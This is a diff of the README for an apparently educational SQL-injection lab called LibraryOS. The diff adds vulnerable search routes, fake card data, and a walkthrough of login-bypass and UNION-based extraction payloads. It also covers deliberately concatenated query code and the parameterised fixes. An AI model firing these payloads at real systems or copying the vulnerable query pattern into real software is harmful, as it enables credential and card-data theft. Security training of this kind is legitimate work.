@@ -1,4 +1,4 @@
-# LibraryOS — SQL Injection Authentication Bypass Lab
+# LibraryOS — SQL Injection Lab
 ### Red Team / Cybersecurity Education Project
 
 > ⚠️ **ETHICAL NOTICE** — This application is **deliberately vulnerable**.
@@ -31,16 +31,18 @@ sqli-lab/
 ├── backend/                    # Flask application
 │   ├── Dockerfile
 │   ├── requirements.txt
-│   ├── app.py                  # Main app — contains vulnerable login
+│   ├── app.py                  # Main app — login + per-page vulnerable search
+│   ├── static/
+│   │   ├── css/style.css       # Application styles
+│   │   └── js/app.js           # Client-side JavaScript
 │   └── templates/
-│       ├── base.html           # Shared layout
+│       ├── base.html           # Shared layout + navigation
 │       ├── login.html          # Vulnerable login form + SQL debug panel
-│       ├── dashboard.html      # Post-login landing page
-│       ├── books.html          # Book catalogue
-│       ├── loans.html          # Loan records
-│       ├── members.html        # Admin-only member list
-│       ├── secrets.html        # Super-admin-only sensitive data
-│       └── cheatsheet.html     # Interactive exploit reference
+│       ├── dashboard.html      # Role-aware landing page (metrics)
+│       ├── books.html          # Book catalogue + vulnerable search
+│       ├── loans.html          # Loan records + vulnerable search
+│       ├── members.html        # Admin-only member list + vulnerable search
+│       └── secrets.html        # Super-admin — member data + bank cards
 │
 └── db/
     └── init.sql                # Schema + seed data (auto-runs on first start)
@@ -60,13 +62,12 @@ sqli-lab/
 │   │  ┌─────────────────────────┐  │                         │
 │   │  │  app.py                 │  │                         │
 │   │  │  ┌──────────────────┐   │  │                         │
-│   │  │  │ /login  ← VULN   │   │  │                         │
+│   │  │  │ /login   ← VULN  │   │  │                         │
 │   │  │  │ /dashboard       │   │  │                         │
-│   │  │  │ /books           │   │  │                         │
-│   │  │  │ /loans           │   │  │                         │
-│   │  │  │ /members  (admin)│   │  │                         │
-│   │  │  │ /secrets (root)  │   │  │                         │
-│   │  │  │ /cheatsheet      │   │  │                         │
+│   │  │  │ /books   ← VULN  │   │  │                         │
+│   │  │  │ /loans   ← VULN  │   │  │                         │
+│   │  │  │ /members ← VULN  │   │  │                         │
+│   │  │  │ /secrets ← VULN  │   │  │                         │
 │   │  │  └──────────────────┘   │  │                         │
 │   │  └─────────────────────────┘  │                         │
 │   └──────────────┬────────────────┘                         │
@@ -89,17 +90,19 @@ sqli-lab/
 ### 1.3 Component Interaction
 
 ```
-Browser → POST /login (username, password)
-       → Flask concatenates inputs into raw SQL string
-       → MySQL executes the raw string
-       → Flask reads row[0]=id, row[1]=username, row[2]=role
-       → Stores in session → redirect to /dashboard
+Login Flow:
+  Browser → POST /login (username, password)
+         → Flask concatenates inputs into raw SQL string
+         → MySQL executes the raw string
+         → Flask reads row[0]=id, row[1]=username, row[2]=role
+         → Stores in session → redirect to /dashboard
 
-Attacker injects SQL into username/password fields
-       → breaks out of string literal
-       → appends OR/UNION/comment clauses
-       → MySQL returns unintended row or synthetic row
-       → Flask grants session based on injected role
+Search Flow (per-page):
+  Browser → GET /books?q=<user_input>
+         → Flask concatenates q into LIKE '%..%' clause
+         → MySQL executes the raw string
+         → Results rendered in table + raw query shown in debug panel
+         → SQL errors displayed for error-based injection feedback
 ```
 
 ---
@@ -110,7 +113,7 @@ Attacker injects SQL into username/password fields
 
 | Component | Choice | Justification |
 |-----------|--------|---------------|
-| **Backend** | Python / Flask | Minimal boilerplate, clean raw-SQL path, excellent for showing the vulnerability without ORM abstraction. Django would hide the SQLi too many layers deep. |
+| **Backend** | Python / Flask | Minimal boilerplate, clean raw-SQL path, excellent for showing the vulnerability without ORM abstraction. |
 | **Database** | MySQL 8.0 | Industry standard, best-known SQL injection target, supports `-- ` and `#` comments, UNION syntax. |
 | **Containerisation** | Docker + Compose | Reproducible environment, one-command startup, isolated network. |
 | **Frontend** | Jinja2 HTML templates | No JS framework needed — keeps focus on backend vulnerability. |
@@ -121,20 +124,36 @@ Attacker injects SQL into username/password fields
 - **Plain-text passwords in DB**: exposes both SQLi AND missing hashing, compounding the severity story.
 - **Login page shows the raw SQL query**: makes the vulnerability visible during the demo without needing browser dev tools.
 - **Three role levels**: provides a clear privilege escalation narrative (user → admin → super_admin).
-- **`/cheatsheet` route**: self-contained exploit reference the presenter can display during the demo.
+- **Per-page search with SQLi**: every data page (`/books`, `/loans`, `/members`, `/secrets`) has its own vulnerable search bar with raw SQL debug panel, allowing UNION-based and error-based injection on each route.
+- **Fake credit card data**: the `/secrets` page exposes simulated banking data (`card_number`, `card_expiry`, `card_cvv`, `card_type`) to demonstrate real-world data breach impact.
+- **Role-aware dashboard**: regular users see only their personal active loan count; admins/super_admins see global stats including member count.
+
+### 2.3 Vulnerable Injection Points
+
+| Route | Injection Vector | SQL Template |
+|-------|-----------------|--------------|
+| `/login` | `username` + `password` fields (POST) | `WHERE username='…' AND password='…'` |
+| `/books` | `q` parameter (GET) | `WHERE title LIKE '%…%' OR author LIKE '%…%'` |
+| `/loans` | `q` parameter (GET) | `WHERE username LIKE '%…%' OR title LIKE '%…%'` |
+| `/members` | `q` parameter (GET) | `WHERE username LIKE '%…%' OR email LIKE '%…%'` |
+| `/secrets` | `q` parameter (GET) | `WHERE username LIKE '%…%'` |
 
 ---
 
 ## 3. Database Schema
 
 ```sql
--- members: authentication target
+-- members: authentication target + sensitive data
 members (
   id          INT AUTO_INCREMENT PK,
   username    VARCHAR(64) UNIQUE NOT NULL,
   password    VARCHAR(255) NOT NULL,    -- plain-text (intentional)
   email       VARCHAR(128) NOT NULL,
   role        ENUM('user','admin','super_admin'),
+  card_number VARCHAR(19)  NULL,        -- fake credit card number
+  card_expiry VARCHAR(5)   NULL,        -- MM/YY
+  card_cvv    VARCHAR(4)   NULL,
+  card_type   VARCHAR(20)  NULL,        -- Visa, Mastercard, etc.
   created_at  DATETIME
 )
 
@@ -159,40 +178,73 @@ loans (
 )
 ```
 
-### Seed Users
+### Seed Data Summary
 
-| Username | Password | Role | Notes |
-|----------|----------|------|-------|
-| `alice` | `alice123` | user | Normal user — attack target for P1/P2 |
-| `bob` | `bobpass` | user | Secondary user |
-| `librarian` | `lib2024!` | admin | Admin — unlocks /members |
-| `root_admin` | `R00t$uper!99` | super_admin | Root — unlocks /secrets |
+- **17 members** (15 users, 1 admin, 1 super_admin)
+- **20 books** across Technology, Fiction, Fantasy, Science Fiction, and Security genres
+- **10 loans** with various active/returned/overdue states
+
+### Key User Accounts
+
+| Username | Password | Role | Card Type | Notes |
+|----------|----------|------|-----------|-------|
+| `alice` | `alice123` | user | Visa | Normal user — primary attack target |
+| `bob` | `bobpass` | user | — | No card data |
+| `charlie` | `charlie77` | user | Mastercard | Has card data |
+| `diana` | `wonderwoman` | user | Amex | Has card data |
+| `evan` | `evan_password` | user | Visa | Has card data |
+| `fiona` | `shrekfan` | user | Discover | Has card data |
+| `george` | `curious1` | user | — | No card data |
+| `hannah` | `hannah_montana` | user | Mastercard | Has card data |
+| `ian` | `ian_hacks` | user | Visa | Has card data |
+| `julia` | `julia_childs` | user | Amex | Has card data |
+| `kyle` | `kyle_bro` | user | — | No card data |
+| `laura` | `laura_croft` | user | Mastercard | Has card data |
+| `mike` | `mike_drop` | user | Visa | Has card data |
+| `nina` | `nina_simone` | user | Discover | Has card data |
+| `oscar` | `oscar_grouch` | user | — | No card data |
+| `librarian` | `lib2024!` | admin | Mastercard | Admin — unlocks `/members` |
+| `root_admin` | `R00t$uper!99` | super_admin | Amex | Root — unlocks `/secrets` |
 
 ---
 
 ## 4. Vulnerability Explanation
 
-### 4.1 The Vulnerable Code (app.py ~line 58)
+### 4.1 The Vulnerable Login Code (app.py)
 
 ```python
 # ⚠️ DELIBERATELY VULNERABLE — string concatenation
 query = (
     "SELECT id, username, role FROM members "
     "WHERE username = '" + username + "' "
-    "AND password = '" + password + "'"
+    "AND password = '"   + password + "'"
 )
 cursor.execute(query)    # raw unsanitised string sent to MySQL
-row = cursor.fetchone()
 ```
 
-### 4.2 Why It Is Exploitable
+### 4.2 The Vulnerable Search Code (per-page)
+
+```python
+# ⚠️ DELIBERATELY VULNERABLE — string concatenation in LIKE clause
+query = (
+    "SELECT id,title,author,genre,year,copies FROM books "
+    "WHERE title LIKE '%" + q + "%' OR author LIKE '%" + q + "%' "
+    "ORDER BY title"
+)
+cursor.execute(query)
+```
+
+Each page (`/books`, `/loans`, `/members`, `/secrets`) uses the same pattern with its own column set.
+
+### 4.3 Why It Is Exploitable
 
 1. **User-controlled input** is embedded verbatim into the SQL string.
 2. **No sanitisation**: quotes, dashes, and SQL keywords are passed through unchanged.
 3. **The database cannot distinguish** the injected SQL from the intended query.
-4. **The app trusts the DB result unconditionally**: whatever row comes back, its `role` column becomes the session role.
+4. **The app trusts the DB result unconditionally**: whatever row comes back is rendered.
+5. **Error messages are displayed**: SQL errors are shown in the debug panel, enabling error-based injection.
 
-### 4.3 CWE / OWASP Classification
+### 4.4 CWE / OWASP Classification
 
 - **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command
 - **OWASP Top 10 A03:2021**: Injection
@@ -253,7 +305,7 @@ docker compose up --build
 
 **What happens:**
 1. Docker pulls `python:3.12-slim` and `mysql:8.0` images.
-2. MySQL container starts, runs `db/init.sql` (creates schema + seed data).
+2. MySQL container starts, runs `db/init.sql` (creates schema + seed data with 17 members, 20 books, 10 loans).
 3. Flask container builds, installs requirements, starts `app.py`.
 4. Flask waits for MySQL to pass its healthcheck before connecting.
 
@@ -277,7 +329,7 @@ http://localhost:5000
 
 You should see the **LibraryOS login page** with:
 - A login form (left)
-- Seed credentials table (right)
+- Seed credentials display (right)
 - Vulnerable SQL template display (right)
 
 **Test legitimate login:**
@@ -290,19 +342,23 @@ You should see the **LibraryOS login page** with:
 
 ### Phase 4 — Explore the Application
 
-| Route | Access | Description |
-|-------|--------|-------------|
-| `/login` | public | Vulnerable login form |
-| `/dashboard` | any auth | Welcome page + session info |
-| `/books` | any auth | Book catalogue |
-| `/loans` | any auth | Loans (users see own; admin sees all) |
-| `/members` | admin+ | All member accounts |
-| `/secrets` | super_admin | Simulated sensitive data dump |
-| `/cheatsheet` | public | Full exploit reference |
+| Route | Access | Description | Search SQLi? |
+|-------|--------|-------------|:------------:|
+| `/login` | public | Vulnerable login form | — |
+| `/dashboard` | any auth | Role-aware metrics page | — |
+| `/books` | any auth | Book catalogue (20 books) | ✅ 6 columns |
+| `/loans` | any auth | Loans (users see own; admin sees all) | ✅ 6 columns |
+| `/members` | admin+ | All member accounts (17 members) | ✅ 5 columns |
+| `/secrets` | super_admin | Member data + bank card info | ✅ 8 columns |
+
+Every data page has:
+- A **search form** that sends `GET ?q=...` to the same route
+- A **raw SQL query panel** (yellow) showing the executed query
+- A **database error panel** (red) when the SQL fails — useful for error-based injection
 
 ---
 
-### Phase 5 — Exploit the Vulnerability
+### Phase 5 — Exploit the Login Vulnerability
 
 Open the browser at `http://localhost:5000/login`.
 
@@ -315,13 +371,6 @@ Password: ' OR '1'='1
 
 Observe: SQL panel shows the injected query. Login succeeds as `alice` (first DB row).
 
-**The injected query:**
-```sql
-SELECT id, username, role FROM members
-WHERE username = '' OR '1'='1'
-  AND password = '' OR '1'='1'
-```
-
 ---
 
 #### Attack 2 — Bypass as known user (comment)
@@ -333,15 +382,6 @@ Password: wrongpassword
 
 Note: There is a **space after** the two dashes. This is required by MySQL.
 
-Observe: Password check is commented out. Login succeeds as alice with wrong password.
-
-**The injected query:**
-```sql
-SELECT id, username, role FROM members
-WHERE username = 'alice'--  ' AND password = 'wrongpassword'
---                           ^^^^^^^^^^^^^^^^^^^^ COMMENTED OUT
-```
-
 ---
 
 #### Attack 3 — Escalate to Admin
@@ -351,7 +391,7 @@ Username: librarian'--
 Password: (anything)
 ```
 
-Observe: Logged in as `librarian` with `admin` role. The `/members` menu item appears. Navigate to `/members` — full member list is visible.
+Observe: Logged in as `librarian` with `admin` role. Navigate to `/members` — full member list is visible.
 
 ---
 
@@ -362,7 +402,7 @@ Username: ' UNION SELECT 99,'hacker','super_admin'--
 Password: (anything)
 ```
 
-Observe: The session shows `user: hacker`, `role: super_admin`. Navigate to `/secrets` — the simulated credential dump is accessible. **Note**: this user does not exist in the database — the session is entirely fabricated.
+Observe: Session shows `user: hacker`, `role: super_admin`. Navigate to `/secrets` — card data visible.
 
 ---
 
@@ -373,35 +413,87 @@ Username: root_admin'#
 Password: (anything)
 ```
 
-Observe: Logs in as `root_admin` with `super_admin` role directly.
-
 ---
 
-#### Attack 6 — Role-Based Targeting (without knowing username)
+#### Attack 6 — Role-Based Targeting
 
 ```
 Username: ' OR role='super_admin'-- 
 Password: (anything)
 ```
 
-Observe: Returns first super_admin row without knowing the username.
+---
+
+### Phase 6 — Exploit the Search Vulnerability (Per-Page)
+
+Once logged in, each data page has a search bar vulnerable to UNION-based and error-based injection.
+
+#### Column Counts per Route
+
+| Route | Base Query Columns | Column Count |
+|-------|-------------------|:------------:|
+| `/books` | id, title, author, genre, year, copies | **6** |
+| `/loans` | l.id, m.username, b.title, loaned_at, due_at, returned_at | **6** |
+| `/members` | id, username, email, role, created_at | **5** |
+| `/secrets` | id, username, email, role, card_number, card_expiry, card_cvv, card_type | **8** |
+
+#### UNION Injection — Extract passwords via `/books`
+
+Enter in the `/books` search bar:
+
+```
+' UNION SELECT 1,username,password,role,5,6 FROM members#
+```
+
+The book table will display all usernames and their plain-text passwords.
+
+#### UNION Injection — Extract card data via `/books`
+
+```
+' UNION SELECT 1,username,card_number,card_type,card_expiry,card_cvv FROM members#
+```
+
+#### UNION Injection — Extract passwords via `/members`
+
+Enter in the `/members` search bar:
+
+```
+' UNION SELECT 1,username,password,role,5 FROM members#
+```
+
+#### UNION Injection — Extract passwords via `/secrets`
+
+Enter in the `/secrets` search bar:
+
+```
+' UNION SELECT 1,username,password,4,5,6,7,8 FROM members#
+```
+
+#### Error-Based Injection — Probe column count
+
+Enter in any search bar:
+
+```
+' ORDER BY 1#          → works
+' ORDER BY 6#          → works (if 6 columns)
+' ORDER BY 7#          → error → confirms column count
+```
 
 ---
 
-### Phase 6 — Demonstrate Impact
-
-Navigate to each of these to show privilege escalation impact:
+### Phase 7 — Demonstrate Impact
 
 1. **`/dashboard`** → shows session role in the UI
-2. **`/members`** → visible only after admin bypass (P3/P6)
-3. **`/secrets`** → visible only after super_admin bypass (P4/P5) — shows complete member dump
-4. **`/cheatsheet`** → full payload reference (great for a live demo)
+2. **`/books`** → search bar can dump entire member table via UNION
+3. **`/loans`** → UNION can extract data from any table
+4. **`/members`** → visible only after admin bypass — search dumps passwords
+5. **`/secrets`** → visible only after super_admin bypass — shows card data + search allows cross-table extraction
 
 ---
 
-### Phase 7 — Show the Fix
+### Phase 8 — Show the Fix
 
-In `backend/app.py`, replace the vulnerable block with:
+In `backend/app.py`, replace the vulnerable login block with:
 
 ```python
 # SECURE VERSION — parameterised query
@@ -412,16 +504,29 @@ query = (
 cursor.execute(query, (username, password))
 ```
 
+For search queries, use:
+
+```python
+# SECURE VERSION — parameterised LIKE
+query = (
+    "SELECT id,title,author,genre,year,copies FROM books "
+    "WHERE title LIKE %s OR author LIKE %s "
+    "ORDER BY title"
+)
+pattern = f"%{q}%"
+cursor.execute(query, (pattern, pattern))
+```
+
 Then restart:
 ```bash
 docker compose restart web
 ```
 
-Test that all injection payloads now fail with "Invalid credentials."
+Test that all injection payloads now fail.
 
 ---
 
-### Phase 8 — Stop the Lab
+### Phase 9 — Stop the Lab
 
 ```bash
 # Stop containers (preserves DB volume)
@@ -435,7 +540,7 @@ docker compose down -v
 
 ## 6. Exploit Payloads
 
-### Quick Reference Table
+### Login Payloads
 
 | # | Username field | Password | Target | Technique |
 |---|---------------|----------|--------|-----------|
@@ -446,15 +551,27 @@ docker compose down -v
 | P5 | `root_admin'#` | (any) | root_admin (super_admin) | Hash comment |
 | P6 | `' OR role='super_admin'-- ` | (any) | first super_admin | Role filter |
 
+### Search Payloads (UNION-based data extraction)
+
+| Route | Payload (in search bar) | Extracts |
+|-------|------------------------|----------|
+| `/books` (6 cols) | `' UNION SELECT 1,username,password,role,5,6 FROM members#` | Credentials |
+| `/books` (6 cols) | `' UNION SELECT 1,username,card_number,card_type,card_expiry,card_cvv FROM members#` | Card data |
+| `/loans` (6 cols) | `' UNION SELECT 1,username,password,role,5,6 FROM members#` | Credentials |
+| `/members` (5 cols) | `' UNION SELECT 1,username,password,role,5 FROM members#` | Credentials |
+| `/secrets` (8 cols) | `' UNION SELECT 1,username,password,4,5,6,7,8 FROM members#` | Passwords |
+
 ### How Each Payload Works
 
-**P1 — Tautology**: `' OR '1'='1` closes the string and adds a condition that is always true. The WHERE clause is universally satisfied.
+**P1 — Tautology**: `' OR '1'='1` closes the string and adds a condition that is always true.
 
-**P2/P3/P5 — Comment Injection**: `'-- ` or `'#` closes the string and comments out the rest of the query, including the password check.
+**P2/P3/P5 — Comment Injection**: `'-- ` or `'#` closes the string and comments out the rest of the query.
 
-**P4 — UNION Injection**: `UNION SELECT` appends a completely fabricated row to the result set. The app reads this row's columns as if they came from the database.
+**P4 — UNION Injection**: `UNION SELECT` appends a fabricated row to the result set.
 
-**P6 — Role Filter**: Instead of targeting a specific user, filters by `role` column directly.
+**P6 — Role Filter**: Filters by `role` column directly, no username needed.
+
+**Search UNION**: The `'` closes the LIKE string, `UNION SELECT` appends rows from another table (or the same table with different columns). The `#` comments out the trailing `%'` and any ORDER BY.
 
 ---
 
@@ -464,26 +581,37 @@ docker compose down -v
 
 ```python
 # VULNERABLE (before):
-query = "SELECT id, username, role FROM members WHERE username = '" + username + "' AND password = '" + password + "'"
+query = "SELECT ... WHERE username = '" + username + "' AND password = '" + password + "'"
 cursor.execute(query)
 
 # SECURE (after):
-query = "SELECT id, username, role FROM members WHERE username = %s AND password = %s"
+query = "SELECT ... WHERE username = %s AND password = %s"
 cursor.execute(query, (username, password))
 ```
 
-**Why it works**: The database driver sends the query template and the values separately over the wire. MySQL compiles the query first, then substitutes values. Values can never alter the query's structure.
+**Why it works**: The database driver sends the query template and the values separately. MySQL compiles the query first, then substitutes values. Values can never alter the query's structure.
 
-### Fix 2 — Password Hashing
+### Fix 2 — Parameterised Search
+
+```python
+# VULNERABLE (before):
+query = "SELECT ... WHERE title LIKE '%" + q + "%'"
+cursor.execute(query)
+
+# SECURE (after):
+query = "SELECT ... WHERE title LIKE %s"
+cursor.execute(query, (f"%{q}%",))
+```
+
+### Fix 3 — Password Hashing
 
 ```python
 import bcrypt
 
 # At registration:
 hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
-# Store hashed in DB
 
-# At login (fetch user by username only — then verify hash):
+# At login:
 query = "SELECT id, username, role, password FROM members WHERE username = %s"
 cursor.execute(query, (username,))
 row = cursor.fetchone()
@@ -491,7 +619,7 @@ if row and bcrypt.checkpw(password.encode('utf-8'), row[3].encode('utf-8')):
     # grant session
 ```
 
-### Fix 3 — Input Validation
+### Fix 4 — Input Validation
 
 ```python
 import re
@@ -503,13 +631,14 @@ if not validate_username(username):
     return render_template('login.html', error="Invalid input format"), 400
 ```
 
-### Fix 4 — Least Privilege DB Account
+### Fix 5 — Least Privilege DB Account
 
 ```sql
--- Create a DB user with only SELECT on members
 CREATE USER 'appuser'@'%' IDENTIFIED BY 'strongpassword';
 GRANT SELECT ON librarydb.members TO 'appuser'@'%';
--- Even with SQLi, attacker cannot DROP tables or SELECT other DBs
+GRANT SELECT ON librarydb.books   TO 'appuser'@'%';
+GRANT SELECT ON librarydb.loans   TO 'appuser'@'%';
+-- Even with SQLi, attacker cannot DROP tables or write data
 ```
 
 ### Defence-in-Depth Summary
@@ -530,10 +659,12 @@ GRANT SELECT ON librarydb.members TO 'appuser'@'%';
 - "The vulnerability is **one line of code** — string concatenation instead of parameterisation."
 - "The attacker doesn't need to know any password to log in as anyone, including root."
 - "With the UNION payload, the attacker creates an identity that doesn't exist in the database."
+- "Every search bar is an injection point — not just the login form."
+- "The attacker can extract **credit card numbers** from the members table via any search bar."
 - "The fix is also one line — but requires understanding WHY parameterisation works."
 - "Plain-text passwords compound the issue — even without SQLi, a DB dump exposes everything."
 
 ---
 
-*LibraryOS v1.0 — Red Team Education Lab*
+*LibraryOS v2.0 — Red Team Education Lab*
 *OWASP A03:2021 · CWE-89 · For educational use only*
